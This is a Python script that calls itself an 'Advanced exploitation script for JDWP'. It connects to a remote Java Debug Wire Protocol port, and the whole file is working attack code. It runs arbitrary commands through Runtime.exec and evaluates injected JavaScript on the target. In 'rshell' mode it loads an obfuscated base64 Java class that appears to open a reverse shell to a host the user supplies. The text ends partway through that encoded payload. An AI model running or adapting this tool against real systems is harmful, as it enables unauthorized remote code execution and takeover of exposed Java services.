import socket
import time
import sys
import struct
import argparse
import binascii

HANDSHAKE = "JDWP-Handshake"

REQUEST_PACKET_TYPE = 0x00
REPLY_PACKET_TYPE = 0x80

VERSION_SIG = (1, 1)
CLASSESBYSIGNATURE_SIG = (1, 2)
ALLCLASSES_SIG = (1, 3)
ALLTHREADS_SIG = (1, 4)
IDSIZES_SIG = (1, 7)
CREATESTRING_SIG = (1, 11)
SUSPENDVM_SIG = (1, 8)
RESUMEVM_SIG = (1, 9)
SIGNATURE_SIG = (2, 1)
FIELDS_SIG = (2, 4)
METHODS_SIG = (2, 5)
GETVALUES_SIG = (2, 6)
CLASSOBJECT_SIG = (2, 11)
INVOKESTATICMETHOD_SIG = (3, 3)
REFERENCETYPE_SIG = (9, 1)
INVOKEMETHOD_SIG = (9, 6)
STRINGVALUE_SIG = (10, 1)
THREADNAME_SIG = (11, 1)
THREADSUSPEND_SIG = (11, 2)
THREADRESUME_SIG = (11, 3)
THREADSTATUS_SIG = (11, 4)
EVENTSET_SIG = (15, 1)
EVENTCLEAR_SIG = (15, 2)
EVENTCLEARALL_SIG = (15, 3)
NEWINSTANCE_SIG = (3, 4)

MODKIND_COUNT = 1
MODKIND_THREADONLY = 2
MODKIND_CLASSMATCH = 5
MODKIND_LOCATIONONLY = 7
EVENT_BREAKPOINT = 2
SUSPEND_EVENTTHREAD = 1
SUSPEND_ALL = 2
NOT_IMPLEMENTED = 99
VM_DEAD = 112
INVOKE_SINGLE_THREADED = 2
TAG_OBJECT = 76
TAG_STRING = 115
TYPE_CLASS = 1
MODKIND_STEP = 10
EVENTKIND_STEP = 1
STEP_MIN = 0
STEP_INTO = 0


class JDWPClient:
    def __init__(self, host, port=8000):
        self.host = host
        self.port = port
        self.methods = {}
        self.fields = {}
        self.id = 0x01
        return

    def create_packet(self, cmdsig, data=""):
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        pkt = struct.pack(">IIccc", pktlen, self.id, chr(flags), chr(cmdset), chr(cmd))
        pkt += data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self.socket.recv(11)
        pktlen, id, flags, errcode = struct.unpack(">IIcH", header)

        if flags == chr(REPLY_PACKET_TYPE):
            if errcode:
                raise Exception("Received errcode %d" % errcode)

        buf = ""
        while len(buf) + 11 < pktlen:
            data = self.socket.recv(1024)
            if len(data):
                buf += data
            else:
                time.sleep(1)
        return buf

    def parse_entries(self, buf, formats, explicit=True):
        entries = []
        index = 0

        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = int(struct.unpack(">Q", buf[index:index + 8])[0])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = int(struct.unpack(">I", buf[index:index + 4])[0])
                    index += 4
                elif fmt == 'S':
                    l = struct.unpack(">I", buf[index:index + 4])[0]
                    data[name] = buf[index + 4:index + 4 + l]
                    index += 4 + l
                elif fmt == 'C':
                    data[name] = ord(struct.unpack(">c", buf[index])[0])
                    index += 1
                elif fmt == 'Z':
                    t = ord(struct.unpack(">c", buf[index])[0])
                    if t == 115:
                        s = self.solve_string(buf[index + 1:index + 9])
                        data[name] = s
                        index += 9
                    elif t == 73:
                        data[name] = struct.unpack(">I", buf[index + 1:index + 5])[0]
                        buf = struct.unpack(">I", buf[index + 5:index + 9])
                        index = 0

                else:
                    print("Error")
                    sys.exit(1)

            entries.append(data)

        return entries

    def format(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)

        raise Exception("Unknown format")

    def unformat(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", value[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", value[:4])[0]
        else:
            raise Exception("Unknown format")
        return

    def start(self):
        self.handshake(self.host, self.port)
        self.idsizes()
        self.getversion()
        self.allclasses()
        return

    def handshake(self, host, port):
        s = socket.socket()
        try:
            s.connect((host, port))
        except socket.error as msg:
            raise Exception("Failed to connect: %s" % msg)

        s.send(HANDSHAKE)

        if s.recv(len(HANDSHAKE)) != HANDSHAKE:
            raise Exception("Failed to handshake")
        else:
            self.socket = s

        return

    def leave(self):
        self.socket.close()
        return

    def getversion(self):
        self.socket.sendall(self.create_packet(VERSION_SIG))
        buf = self.read_reply()
        formats = [('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                   ('S', "vmVersion"), ('S', "vmName"), ]
        for entry in self.parse_entries(buf, formats, False):
            for name, value in entry.iteritems():
                setattr(self, name, value)
        return

    @property
    def version(self):
        return "%s - %s" % (self.vmName, self.vmVersion)

    def idsizes(self):
        self.socket.sendall(self.create_packet(IDSIZES_SIG))
        buf = self.read_reply()
        formats = [("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                   ("I", "referenceTypeIDSize"), ("I", "frameIDSize")]
        for entry in self.parse_entries(buf, formats, False):
            for name, value in entry.iteritems():
                setattr(self, name, value)
        return

    def allthreads(self):
        try:
            getattr(self, "threads")
        except:
            self.socket.sendall(self.create_packet(ALLTHREADS_SIG))
            buf = self.read_reply()
            formats = [(self.objectIDSize, "threadId")]
            self.threads = self.parse_entries(buf, formats)
        finally:
            return self.threads

    def get_thread_by_name(self, name):
        self.allthreads()
        for t in self.threads:
            threadId = self.format(self.objectIDSize, t["threadId"])
            self.socket.sendall(self.create_packet(THREADNAME_SIG, data=threadId))
            buf = self.read_reply()
            if len(buf) and name == self.readstring(buf):
                return t
        return None

    def get_name_by_threadId(self, threadId):
        threadId = self.format(self.objectIDSize, threadId)
        self.socket.sendall(self.create_packet(THREADNAME_SIG, data=threadId))
        buf = self.read_reply()
        formats = [('S', "name")]
        buf = self.parse_entries(buf, formats, False)
        return buf[0]['name']

    def allclasses(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall(self.create_packet(ALLCLASSES_SIG))
            buf = self.read_reply()
            formats = [('C', "refTypeTag"),
                       (self.referenceTypeIDSize, "refTypeId"),
                       ('S', "signature"),
                       ('I', "status")]
            self.classes = self.parse_entries(buf, formats)

        return self.classes

    def get_class_by_signature(self, signature):
        for entry in self.classes:
            if entry["signature"] == signature:
                return entry
        return None

    def get_methods(self, refTypeId):
        if not self.methods.has_key(refTypeId):
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall(self.create_packet(METHODS_SIG, data=refId))
            buf = self.read_reply()
            formats = [(self.methodIDSize, "methodId"),
                       ('S', "name"),
                       ('S', "signature"),
                       ('I', "modBits")]
            self.methods[refTypeId] = self.parse_entries(buf, formats)
        return self.methods[refTypeId]

    def get_method_by_name(self, name):
        for refId in self.methods.keys():
            for entry in self.methods[refId]:
                if entry["name"].lower() == name.lower():
                    return entry
        return None

    def getfields(self, refTypeId):
        if not self.fields.has_key(refTypeId):
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall(self.create_packet(FIELDS_SIG, data=refId))
            buf = self.read_reply()
            formats = [(self.fieldIDSize, "fieldId"),
                       ('S', "name"),
                       ('S', "signature"),
                       ('I', "modbits")]
            self.fields[refTypeId] = self.parse_entries(buf, formats)
        return self.fields[refTypeId]

    def getvalue(self, refTypeId, fieldId):
        data = self.format(self.referenceTypeIDSize, refTypeId)
        data += struct.pack(">I", 1)
        data += self.format(self.fieldIDSize, fieldId)
        self.socket.sendall(self.create_packet(GETVALUES_SIG, data=data))
        buf = self.read_reply()
        formats = [("Z", "value")]
        field = self.parse_entries(buf, formats)[0]
        return field

    def createstring(self, data):
        buf = self.buildstring(data)
        self.socket.sendall(self.create_packet(CREATESTRING_SIG, data=buf))
        buf = self.read_reply()
        return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)

    def buildstring(self, data):
        return struct.pack(">I", len(data)) + data

    def readstring(self, data):
        size = struct.unpack(">I", data[:4])[0]
        return data[4:4 + size]

    def suspendvm(self):
        self.socket.sendall(self.create_packet(SUSPENDVM_SIG))
        self.read_reply()
        return

    def resumevm(self):
        self.socket.sendall(self.create_packet(RESUMEVM_SIG))
        self.read_reply()
        return

    def invokestatic(self, classId, threadId, methId, *args):
        data = self.format(self.referenceTypeIDSize, classId)
        data += self.format(self.objectIDSize, threadId)
        data += self.format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKESTATICMETHOD_SIG, data=data))
        buf = self.read_reply()
        return buf

    def invoke(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data += self.format(self.objectIDSize, threadId)
        data += self.format(self.referenceTypeIDSize, classId)
        data += self.format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKEMETHOD_SIG, data=data))
        buf = self.read_reply()
        return buf

    def newInstance(self, classId, threadId, methId, *args):
        data = self.format(self.referenceTypeIDSize, classId)
        data += self.format(self.objectIDSize, threadId)
        data += self.format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(NEWINSTANCE_SIG, data=data))
        buf = self.read_reply()
        return buf

    def solve_string(self, objId):
        self.socket.sendall(self.create_packet(STRINGVALUE_SIG, data=objId))
        buf = self.read_reply()
        if len(buf):
            return self.readstring(buf)
        else:
            return ""

    def query_thread(self, threadId, kind):
        data = self.format(self.objectIDSize, threadId)
        self.socket.sendall(self.create_packet(kind, data=data))
        buf = self.read_reply()
        return buf

    def suspend_thread(self, threadId):
        return self.query_thread(threadId, THREADSUSPEND_SIG)

    def status_thread(self, threadId):
        buf = self.query_thread(threadId, THREADSTATUS_SIG)
        formats = [('I', "threadStatus"),
                   ('I', 'suspendStatus')]
        threadStatus = client.parse_entries(buf, formats, False)
        return threadStatus

    def resume_thread(self, threadId):
        return self.query_thread(threadId, THREADRESUME_SIG)

    def send_event(self, eventCode, *args):
        data = ""
        data += chr(eventCode)
        data += chr(SUSPEND_ALL)
        data += struct.pack(">I", len(args))

        for kind, option in args:
            data += chr(kind)
            data += option

        self.socket.sendall(self.create_packet(EVENTSET_SIG, data=data))
        buf = self.read_reply()
        return struct.unpack(">I", buf)[0]

    def clear_event(self, eventCode, rId):
        data = chr(eventCode)
        data += struct.pack(">I", rId)
        self.socket.sendall(self.create_packet(EVENTCLEAR_SIG, data=data))
        self.read_reply()
        return

    def clear_events(self):
        self.socket.sendall(self.create_packet(EVENTCLEARALL_SIG))
        self.read_reply()
        return

    def wait_for_event(self):
        buf = self.read_reply()
        return buf

    def parse_event(self, buf, eventId):
        num = struct.unpack(">I", buf[2:6])[0]
        rId = struct.unpack(">I", buf[6:10])[0]
        if rId != eventId:
            return None
        tId = self.unformat(self.objectIDSize, buf[10:10 + self.objectIDSize])
        loc = -1  # don't care
        return rId, tId, loc


# ================================================================================================================================================
def get_class_id(jdwp, signature):
    c = jdwp.get_class_by_signature(signature)
    if 'refTypeId' in c:
        return c["refTypeId"]
    else:
        raise Exception("[-] get class failed : {}".format(signature))


def get_method_id(jdwp, class_id, method_name, signature):
    methods = jdwp.get_methods(class_id)
    for method in methods:
        if method["name"] == method_name and method["signature"] == signature:
            if "methodId" in method:
                return method["methodId"]
    raise Exception("[-] get method failed : {}".format(method_name))


def get_thread_id(jdwp):
    thread_id = 0
    threads = jdwp.allthreads()
    for thread in threads:
        threadStatus = jdwp.status_thread(thread['threadId'])
        threadStatus = threadStatus[0]["threadStatus"]
        if threadStatus == 2:  # Sleeping
            thread_id = thread['threadId']
            break
    if thread_id == 0:
        raise Exception("[-] Could not find a suitable thread for stepping")
    print("[+] Setting 'step into' event in thread: {:#x}".format(thread_id))
    jdwp.suspendvm()
    step_info = jdwp.format(jdwp.objectIDSize, thread_id)
    step_info += struct.pack(">I", STEP_MIN)
    step_info += struct.pack(">I", STEP_INTO)
    data = [(MODKIND_STEP, step_info), ]
    rId = jdwp.send_event(EVENTKIND_STEP, *data)
    # 4. resume vm and wait for event
    jdwp.resumevm()
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event(buf, rId)
        if ret is not None:
            break
    rId, tId, loc = ret
    print ("[+] Received matching event from thread: {:#x}".format(tId))
    jdwp.clear_event(EVENTKIND_STEP, rId)
    return tId


def get_string_id(jdwp, string):
    try:
        return jdwp.createstring(string)[0]["objId"]
    except Exception as e:
        raise Exception("[-] get string failed : {}".format(string))


def invoke_static_object(jdwp, thread_id, class_id, method_id, param_id):
    if param_id:
        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id), ]
        buf = jdwp.invokestatic(class_id, thread_id, method_id, *data)
    else:
        buf = jdwp.invokestatic(class_id, thread_id, method_id)
    if buf[0] != chr(TAG_OBJECT):
        raise Exception("[-] invoke static object failed")
    return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])


def invoke_static_class(jdwp, thread_id, class_id, method_id, param_id):
    if param_id:
        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id), ]
        buf = jdwp.invokestatic(class_id, thread_id, method_id, *data)
    else:
        buf = jdwp.invokestatic(class_id, thread_id, method_id)
    if buf[0] != 'c':
        raise Exception("[-] invoke static class failed")
    return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])


def invoke_object(jdwp, thread_id, class_id, object_id, method_id, param_id):
    if param_id:
        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
        buf = jdwp.invoke(object_id, thread_id, class_id, method_id, *data)
    else:
        buf = jdwp.invoke(object_id, thread_id, class_id, method_id)
    if buf[0] != chr(TAG_OBJECT):
        raise Exception("[-] invoke object failed")
    return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])


def invoke_string(jdwp, thread_id, class_id, object_id, method_id, param_id):
    if param_id:
        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
        buf = jdwp.invoke(object_id, thread_id, class_id, method_id, *data)
    else:
        buf = jdwp.invoke(object_id, thread_id, class_id, method_id)
    if buf[0] != chr(TAG_STRING):
        raise Exception("[-] invoke string failed")
    return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])


def invoke(jdwp, thread_id, class_id, object_id, method_id, param_id):
    if param_id:
        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
        buf = jdwp.invoke(object_id, thread_id, class_id, method_id, *data)
    else:
        buf = jdwp.invoke(object_id, thread_id, class_id, method_id)
    return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])


def new_instance(jdwp, thread_id, class_id, method_id, param_id):
    if param_id:
        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, param_id)]
        buf = jdwp.newInstance(class_id, thread_id, method_id, *data)
    else:
        buf = jdwp.newInstance(class_id, thread_id, method_id)
    if buf[0] != chr(TAG_OBJECT):
        raise Exception("[-] new instance failed")
    return jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])


# ================================================================================================================================================

def runtime_exec(jdwp, cmd):
    try:
        thread_id = get_thread_id(jdwp)

        runtime_class_id = get_class_id(jdwp, "Ljava/lang/Runtime;")
        print ("[+] Found Runtime class: {:#x}".format(runtime_class_id))

        getRuntime_method_id = get_method_id(jdwp, runtime_class_id, "getRuntime", "()Ljava/lang/Runtime;")
        print ("[+] Found Runtime.getRuntime(): {:#x}".format(getRuntime_method_id))

        string_id = get_string_id(jdwp, cmd)
        print ("[+] Command string created: {:#x}, command: {}".format(string_id, cmd))

        runtime_object_id = invoke_static_object(jdwp, thread_id, runtime_class_id, getRuntime_method_id, None)
        print ("[+] Runtime.getRuntime() returned context: {:#x}".format(runtime_object_id))

        exec_method_id = get_method_id(jdwp, runtime_class_id, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
        print ("[+] found Runtime.exec(): {:#x}".format(exec_method_id))

        retId = invoke_object(jdwp, thread_id, runtime_class_id, runtime_object_id, exec_method_id, string_id)
        print ("[+] Runtime.exec() successful, retId: {:#x} ".format(retId))
    except Exception as e:
        print(e.message)
        jdwp.resumevm()


def run_js_code(jdwp, code):
    code = '''
function hexDecode(str) {{
    var hex = str.toString();
    var output = '';
    for (var i = 0; i < hex.length; i += 2) {{
        output += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }}
    return output;
}}
var result = 'null';
try {{
    result = eval(hexDecode('{}'))
}}catch(e){{
    result = e.message;
}}
if(!result){{
    result = 'null';
}}
result.toString();'''.format(binascii.hexlify(code))
    try:
        thread_id = get_thread_id(jdwp)

        class_class_id = get_class_id(jdwp, "Ljava/lang/Class;")
        forName_method_id = get_method_id(jdwp, class_class_id, "forName", "(Ljava/lang/String;)Ljava/lang/Class;")

        scriptEngineManager_class_id = invoke_static_class(jdwp, thread_id, class_class_id, forName_method_id,
                                                           get_string_id(jdwp, "javax.script.ScriptEngineManager"))
        scriptEngineManager_init_method_id = get_method_id(jdwp, scriptEngineManager_class_id, "<init>", "()V")
        scriptEngineManager_object_id = new_instance(jdwp, thread_id, scriptEngineManager_class_id,
                                                     scriptEngineManager_init_method_id, None)

        getEngineByName_method_id = get_method_id(jdwp, scriptEngineManager_class_id, "getEngineByName",
                                                  "(Ljava/lang/String;)Ljavax/script/ScriptEngine;")
        engine_object_id = invoke_object(jdwp, thread_id, scriptEngineManager_class_id, scriptEngineManager_object_id,
                                         getEngineByName_method_id, get_string_id(jdwp, "js"))

        abstractScriptEngine_class_id = invoke_static_class(jdwp, thread_id, class_class_id, forName_method_id,
                                                            get_string_id(jdwp, "javax.script.AbstractScriptEngine"))
        eval_method_id = get_method_id(jdwp, abstractScriptEngine_class_id, "eval",
                                       "(Ljava/lang/String;)Ljava/lang/Object;")
        result_object_id = invoke(jdwp, thread_id, abstractScriptEngine_class_id, engine_object_id, eval_method_id,
                                  get_string_id(jdwp, code))

        object_class_id = get_class_id(jdwp, "Ljava/lang/Object;")
        toString_method_id = get_method_id(jdwp, object_class_id, "toString", "()Ljava/lang/String;")
        result_string = invoke_string(jdwp, thread_id, object_class_id, result_object_id, toString_method_id, None)
        res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, result_string))

        return res
    except Exception as e:
        print(e.message)
        jdwp.resumevm()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced exploitation script for JDWP by @leixiao, base on @_hugsy_, @Lz1y, @r3change",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument("-t", type=str, metavar="IP", help="Remote target IP", required=True)
    parser.add_argument("-p", type=int, metavar="Port", default=8000, help="Remote target port")
    parser.add_argument("-m", type=str, metavar="Mode", default="code", help="command/code/rshell")
    parser.add_argument("-c", type=str, metavar="Command/Code", help="Command or JavaScript Code")

    parser.add_argument("-a", type=str, metavar="Address", help="The address of reverse shell")
    parser.add_argument("-l", type=str, metavar="life", default= 1, help="The survival time (minute) of the shell when unable to connect to the server")
    args = parser.parse_args()

    client = JDWPClient(args.t, args.p)
    try:
        client.start()
    except:
        print("Handshake failed!")
        client.leave()
        exit(0)
    print("[+] Dump vm description \n{}\n".format(client.description))

    if args.m == "command":
        if not args.c or args.c.strip() == "":
            print("[-] Command cannot be empty")
            exit(0)
        runtime_exec(client, args.c)
    if args.m == "rshell":
        if not args.a or args.a.strip() == "" or ':' not in args.a:
            print("[-] Shell address need be like host:port")
            exit(0)
        code = "function defineClass(base64){var classBytes = java.util.Base64.getDecoder().decode(base64);var intClass = ''.getClass().getDeclaredField('hash').getType();var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod('defineClass',classBytes.class, intClass,intClass);defineClassMethod.setAccessible(true);return defineClassMethod.invoke(new java.lang.ClassLoader(){}, classBytes, 0, classBytes.length);}"
        code += "var shellClass = defineClass('yv66vgAAADQA/AoAgACBCACCCgCAAIMJAD8AhAsAhQCGBwCHCgAGAIgKAAYAiQgAigoABgCLCgAGAIwHAI0IAI4IAI8KAJAAkQgAkggAkwgAlAgAlQgAlggAlwoAmACZCgCYAJoKAJsAnAoAnQCeCgCdAJ8GQO1MAAAAAAAJAD8AoAoAoQCiBwCjCQA/AKQJAD8ApQoApgCnCgAfAKgHAKkKAB8AqgoAJACrBwCsBwCtCgAfAK4KACgArwoAJwCwBwCxCgAsAIgIALIKACwAswoAPwC0CAC1CgAkALYKACQAtwoAJwC4CABuCAC5CgAfALoKAD8AuwgAvAUAAAAAAAATiAoASAC9BwC+CgBIAIgHAL8KAD8AwAoAPwDBCADCCgCmAMMGP9MzMzMzMzMKAKEAxAoAPwDFBwDGAQAMc2NyaXB0RW5naW5lAQAbTGphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmU7AQAEaG9zdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAEbGlmZQEAEkxqYXZhL2xhbmcvRG91YmxlOwEACGV4ZWNDb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAGcmVzdWx0AQASTGphdmEvbGFuZy9PYmplY3Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHRoaXMBABFMb3JnL2V4YW1wbGUvQXBwOwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwDHBwC/BwDIBwCNAQAHZ2V0SW5mbwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEaW5mbwEAA3J1bgEAAygpVgEABnNvY2tldAEAEUxqYXZhL25ldC9Tb2NrZXQ7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQACaW4BABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAVpbnB1dAEABGV4aXQBAAFaAQAEdGltZQEAGUxqYXZhL3RpbWUvTG9jYWxEYXRlVGltZTsHAMkHAKMHAKkHAKwHAL4BAAY8aW5pdD4BADooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyO0xqYXZhL2xhbmcvRG91YmxlOylWAQAHZXhwbG9pdAEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAIQXBwLmphdmEHAMgMAMoAYwEAAAwAywDMDABJAEoHAM0MAM4AzwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAB3AGYMANAA0QEAAQoMANAA0gwA0wBjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABiAgb3M6IAEAB29zLm5hbWUHANQMANUAUgEAASABAAdvcy5hcmNoAQAKb3MudmVyc2lvbgEABnVzZXI6IAEACXVzZXIubmFtZQEABmhvc3Q6IAcA1gwA1wDYDADZAGMHAMkMANoA2wcA3AwA3QDeDADfAOAMAE8AUAcA4QwA4gDjAQAPamF2YS9uZXQvU29ja2V0DABLAEwMAE0ATgcA5AwA5QDmDAB3AOcBABNqYXZhL2lvL1ByaW50V3JpdGVyDADoAOkMAHcA6gEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDADrAOwMAHcA7QwAdwDuAQAgamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZU1hbmFnZXIBAAJqcwwA7wDwDABiAGMBAAYKCj4+PiAMAPEA8gwA8wBmDAD0AGMBAAZleGl0KCkMAPUAZgwAUQBSAQAEPj4+IAwA9gD3AQAeamF2YS9sYW5nL0ludGVycnVwdGVkRXhjZXB0aW9uAQAPb3JnL2V4YW1wbGUvQXBwDAB3AHgMAPgAZgEACTEyNy4wLjAuMQwA+QD6DAD5APsMAHkAeAEAEGphdmEvbGFuZy9UaHJlYWQBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAF2phdmEvdGltZS9Mb2NhbERhdGVUaW1lAQAEdHJpbQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAGWphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmUBAARldmFsAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAFGphdmEvbmV0L0luZXRBZGRyZXNzAQAMZ2V0TG9jYWxIb3N0AQAYKClMamF2YS9uZXQvSW5ldEFkZHJlc3M7AQALZ2V0SG9zdE5hbWUBAANub3cBABsoKUxqYXZhL3RpbWUvTG9jYWxEYXRlVGltZTsBABJqYXZhL3RpbWUvRHVyYXRpb24BAAdiZXR3ZWVuAQBQKExqYXZhL3RpbWUvdGVtcG9yYWwvVGVtcG9yYWw7TGphdmEvdGltZS90ZW1wb3JhbC9UZW1wb3JhbDspTGphdmEvdGltZS9EdXJhdGlvbjsBAAh0b01pbGxpcwEAAygpSgEAEGphdmEvbGFuZy9Eb3VibGUBAAtkb3VibGVWYWx1ZQEAAygpRAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIaW50VmFsdWUBAAMoKUkBABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAPZ2V0RW5naW5lQnlOYW1lAQAvKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZTsBAAVwcmludAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAIcmVhZExpbmUBAAVjbG9zZQEABXNsZWVwAQAEKEopVgEABXN0YXJ0AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABUoRClMamF2YS9sYW5nL0RvdWJsZTsAIQA/AEgAAAAEAAIASQBKAAAAAgBLAEwAAAACAE0ATgAAAAIATwBQAAAABgACAFEAUgABAFMAAADdAAIAAwAAAEortgABEgK2AAOZAAYSArAqtAAEK7kABQIATSzGABe7AAZZtwAHLLYACBIJtgAKtgALsBICsE27AAZZtwAHLLYACBIJtgAKtgALsAACAA8AMQA1AAwAMgA0ADUADAADAFQAAAAiAAgAAAAVAAwAFgAPABkAGgAaAB4AGwAyAB0ANQAfADYAIABVAAAAKgAEABoAGwBWAFcAAgA2ABQAWABZAAIAAABKAFoAWwAAAAAASgBcAEwAAQBdAAAAGQADD/wAIgcAXv8AAgACBwBfBwBgAAEHAGEAAgBiAGMAAQBTAAABMAACAAMAAACxuwAGWbcABxINtgAKEg64AA+2AAoSELYAChIRuAAPtgAKEhC2AAoSErgAD7YACrYAC0y7AAZZtwAHK7YAChIJtgAKtgALTLsABlm3AAcrtgAKEhO2AAoSFLgAD7YACrYAC0y7AAZZtwAHK7YAChIJtgAKtgALTLsABlm3AAcrtgAKEhW2AAq4ABa2ABe2AAq2AAtMpwAcTbsABlm3AAcrtgAKEhW2AAostgAItgALTCuwAAEAdgCTAJYADAADAFQAAAAmAAkAAAAlADIAJgBGACcAYgAoAHYAKgCTAC0AlgArAJcALACvAC4AVQAAACAAAwCXABgAWABZAAIAAACxAFoAWwAAADIAfwBkAEwAAQBdAAAAEwAC/wCWAAIHAF8HAGAAAQcAYRgAAQBlAGYAAQBTAAACBQAFAAcAAAD1Azy4ABhNLLgAGLgAGbYAGooUABtvKrQAHbYAHpicANcbmgDTuwAfWSq0ACAqtAAhtgAitwAjTrsAJFkttgAltwAmOgS7ACdZuwAoWS22ACm3ACq3ACs6BSq7ACxZtwAtEi62AC+1AAQZBLsABlm3AAcqtwAwtgAKEjG2AAq2AAu2ADIZBLYAMxkFtgA0WToGxgBPuAAYTRkGtgABEjW2AAOaABAZBrYAARI2tgADmQAMBDwttgA3pwAoGQS7AAZZtwAHKhkGtwA4tgAKEjm2AAq2AAu2ADIZBLYAM6f/rKcABE4bmv8iFAA6uAA8p/8ZTqf/FbEAAgAkAN8A4gAMAOcA7QDwAD0AAwBUAAAAZgAZAAAAMwACADQABgA1ACQANwA3ADgARAA5AFgAOwBoAD0AgwA+AIgAQACTAEEAlwBDALEARACzAEUAtwBGALoASADXAEkA3wBNAOIASwDjAE8A5wBRAO0AVADwAFIA8QBUAPQAVwBVAAAASAAHADcAqABnAGgAAwBEAJsAaQBqAAQAWACHAGsAbAAFAJAATwBtAEwABgAAAPUAWgBbAAAAAgDzAG4AbwABAAYA7wBwAHEAAgBdAAAANAAJ/QAGAQcAcv4AgQcAcwcAdAcAdfwAKAcAYAj/ACQAAwcAXwEHAHIAAEIHAGEATAcAdgMAAQB3AHgAAQBTAAAAbAACAAQAAAAUKrcAPiortQAgKiy1ACEqLbUAHbEAAAACAFQAAAAWAAUAAABZAAQAWgAJAFs